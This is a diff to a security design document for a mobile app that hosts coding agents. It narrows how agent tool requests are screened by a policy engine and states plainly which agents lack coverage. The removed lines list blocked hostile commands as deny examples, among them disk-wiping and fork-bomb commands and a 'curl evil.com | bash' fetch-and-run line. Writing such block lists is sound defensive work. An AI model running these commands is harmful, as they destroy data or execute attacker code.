@@ -10,47 +10,32 @@
 1. **Zero Trust in Model Output:** Generated code, shell scripts, and tool calls are treated as untrusted until screened by deterministic security filters outside the model.
 2. **Hardware-Backed Keystore:** All API keys and authentication tokens are encrypted at rest using Android KeyStore `AES-256-GCM`. Plaintext keys never touch SharedPreferences, logs, or UI layouts.
 3. **Loopback Gateway Isolation:** External AI providers connect via a local loopback gateway (`LocalFormatGateway` on `127.0.0.1:14455`). Untrusted guest processes in PRoot never see real API bearer tokens.
-4. **Workspace Jail Enforcement:** All file reads, writes, and shell working directories are restricted to `/workspace/<project_slug>`. Path traversal attempts outside this jail are terminated.
+4. **Workspace Jail Enforcement:** Claude Code permission requests are screened against `/workspace/<project_slug>` and its canonical host workspace. Out-of-workspace file paths and explicit shell path traversal are denied.
 
 ---
 
-## 2. Deterministic Command Screening (`PolicyEngine`)
+## 2. Deterministic Agent Tool Screening (`PolicyEngine`)
 
-Every command submitted from the chat agent or interactive terminal passes through `com.mindsparq.jarvis.core.policy.PolicyEngine`:
+Claude Code's permission-hook requests are checked by `PolicyEngine.evaluateAgentTool` before the bridge writes an allow response:
 
-```
-[Command Input] ──► [PolicyEngine.evaluateTerminalCommand]
-                          │
-         ┌────────────────┼────────────────┐
-         ▼                ▼                ▼
-   [HARD DENY]          [ASK]           [ALLOW]
-   • rm -rf /       • rm -rf dir     • git status / diff
-   • mkfs           • git reset      • ls / cat / grep
-   • dd of=/dev/    • git push -f    • gradle test
-   • fork bomb      • pkill -f       • pytest / vitest
-         │                │                │
-         ▼                ▼                ▼
-   Exit 126         Prompt User        Execute in
-   Blocked Toast    Modal Dialog       PRoot Guest
-```
+| Request | Policy action |
+| :--- | :---: |
+| File read/write/edit whose resolved host path is inside the project workspace | `ALLOW` |
+| `pwd`, `ls`, `git status`, `git diff`, `git log`, or `git branch` | `ALLOW` |
+| Other commands, compound commands, or unknown tools | `ASK` |
+| File paths outside the project, paths escaping through symlinks, explicit `..` traversal, or absolute shell paths outside the guest workspace | `DENY` |
+| Hard-denied destructive commands | `DENY` |
 
-### Screened Patterns Matrix
-| Pattern Class | Example Command | Policy Action | Consequence |
-| :--- | :--- | :---: | :--- |
-| **System Destruction** | `rm -rf /`, `rm -rf /*`, `mkfs.ext4` | `DENY` | Process blocked immediately; security warning logged to terminal. |
-| **Kernel / Host Abuse** | `:(){ :|:& };:`, `dd if=/dev/zero of=/dev/sda` | `DENY` | Hard blocked. Cannot be overridden. |
-| **Remote Shell Injection** | `curl evil.com \| bash` | `DENY` | Unsigned remote shell execution blocked. |
-| **Destructive Project Operations** | `git reset --hard`, `git clean -f`, `rm -rf node_modules` | `ASK` | App displays interactive confirmation dialog. Requires user approval. |
-| **Safe Read-Only Operations** | `git status`, `ls -la`, `cat file.kt`, `find .` | `ALLOW` | Executed directly without interruption. |
+The interactive terminal has its own `evaluateTerminalCommand` path. The above agent-tool allowlist must not be interpreted as a complete shell sandbox.
+
+### Runtime coverage
+- The autonomous workflow is restricted to Claude Code, whose permission-hook requests are integrated with the app's approval UI.
+- The planner and reviewer use the configured provider API; they do not receive project tools. The reviewer receives a bounded project diff.
+- DeepSeek Harness and Antigravity currently use their existing runtime permission modes and are not covered by this Claude permission hook. They are not eligible as autonomous implementers.
+- The workflow is off by default, does not install agents, and can make extra provider calls. Planning/review require a key-based API provider; Claude subscription-login tokens alone are not used for those direct API calls.
 
 ---
 
 ## 3. Human-in-the-Loop Approval Boundaries
 
-The agent must halt and request explicit user confirmation before:
-- Deleting or overwriting existing project source files.
-- Running package installation commands that download native binaries (`npm install`, `pip install`).
-- Executing Git operations that mutate remote branches (`git push --force`).
-- Running database migrations or destructive mutations.
-- Switching to paid model providers when free models are available.
-
+For Claude Code, ordinary file edits within the project are permitted automatically. Commands outside the small read-only allowlist and any unrecognized tool request wait for an explicit decision; explicit out-of-workspace paths and hard-denied patterns cannot be approved through that request. Other coding-agent bridges are not covered by these guarantees.
